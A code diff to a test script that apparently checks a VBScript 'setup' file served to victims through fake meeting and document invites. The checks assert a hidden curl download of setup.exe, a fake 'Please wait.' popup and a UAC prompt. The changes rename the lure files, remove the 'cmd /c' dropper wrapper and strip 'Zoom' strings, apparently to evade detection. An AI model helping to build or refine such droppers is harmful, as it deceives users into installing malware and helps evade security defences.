@@ -95,8 +95,8 @@ async function main() {
       inviteTemplate === 'adobe'
         ? 'DocumentViewer-Setup.vbs'
         : inviteTemplate === 'google_meet'
-          ? 'GoogleMeet-Setup.vbs'
-          : 'ZoomClient-Setup.vbs';
+          ? 'Meet-Setup.vbs'
+          : 'Meeting-Setup.vbs';
 
     const vbsRes = await fetch(`${API}/guest/${code}/setup.vbs?v=${CACHE_BUST}`);
     if (vbsRes.status !== 200) {
@@ -106,12 +106,14 @@ async function main() {
     const vbs = await vbsRes.text();
     const vbsChecks = [
       ['please-wait popup', vbs.includes('Please wait.')],
-      ['hidden curl download', vbs.includes('sh.Run("cmd /c " & cmd, 0, True)')],
+      ['hidden curl download', vbs.includes('sh.Run(cmd, 0, True)')],
+      ['no cmd dropper wrapper', !vbs.includes('cmd /c')],
       ['downloads setup.exe', vbs.includes('setup.exe')],
       ['uac on gui exe', vbs.includes('app.ShellExecute setupExe')],
       ['no powershell bypass', !/ExecutionPolicy Bypass/i.test(vbs)],
       ['no invoke-webrequest', !vbs.includes('Invoke-WebRequest')],
       ['no self-elevate wscript', !vbs.includes('wscript.exe')],
+      ['no zoom impersonation in script', !/Zoom/i.test(vbs)],
       ['no visible terminal zip', !vbs.includes('--progress-bar')],
       ['no powershellw', !vbs.includes('powershellw.exe')],
       ['no broken inline nest', !vbs.includes('Invoke-AgentInstall')],
